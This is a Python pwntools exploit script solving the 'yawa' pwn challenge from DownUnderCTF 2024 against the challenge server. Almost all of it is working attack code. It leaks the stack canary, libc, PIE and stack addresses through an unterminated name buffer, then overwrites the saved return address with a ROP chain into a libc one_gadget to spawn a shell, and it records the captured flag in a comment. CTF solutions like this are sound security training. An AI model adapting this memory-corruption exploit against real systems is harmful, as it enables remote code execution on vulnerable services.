#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwntmpl -nc 'nc 2024.ductf.dev 30010' yawa
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'yawa')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '2024.ductf.dev'
port = int(args.PORT or 30010)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libc.so.6')
else:
    libc = ELF('libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# RUNPATH:    b'.'
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()

def set_name(name):
    io.sendlineafter(b"> ", b"1")
    if len(name) >= 0x88:
        io.send(name[:0x88])
    else:
        io.sendline(name)
def get_name():
    io.sendlineafter(b"> ", b"2")
    io.recvuntil(b"Hello, ")
    return io.recvuntil(b"\n1. Tell me your name", drop=True)
def stop():
    io.sendlineafter(b"> ", b"3")

def leak_idx(idx, size):
    set_name(cyclic(idx-1))
    leak = get_name()[idx:idx+size]
    if len(leak) != size:
        log.warn(f"len(leak) != size: {len(leak)} != {size}")
    return leak


canary = u64(b"\x00" + leak_idx(88+1, 7)) # There's a null byte in the cookie (LSByte), so we first overwrite it, and then remove it
log.success("canary leak: {}".format(hex(canary)))

libc_leak = u64(leak_idx(88+16,8).ljust(8, b"\x00"))
libc.address = libc_leak - 0x29d90
log.success("libc addr: {}".format(hex(libc.address)))

# You don't really need to leak pie, but you can, so why not :D
pie = u64(leak_idx(88+32,8).ljust(8, b"\x00")) - 0x12b1
log.success("pie leak: {}".format(hex(pie)))

aslr = u64(leak_idx(88+48,8).ljust(8, b"\x00"))
log.success("aslr leak: {}".format(hex(aslr)))

one_gadget = 0xebd43
rop = ROP(exe)
rop.raw(libc.address + 0x2a2e0)     # pop rbp
rop.raw(aslr-248+0x70)              # Offset such that [rbp-0x70] == 0 (one_gadget constraint)
rop.raw(libc.address + one_gadget)  # one_gadget
rop.raw(0)                          # This is the 0 rbp will use

set_name(fit({
    88: canary,
    88+16: rop.chain()
}))

stop()

io.interactive() # DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}
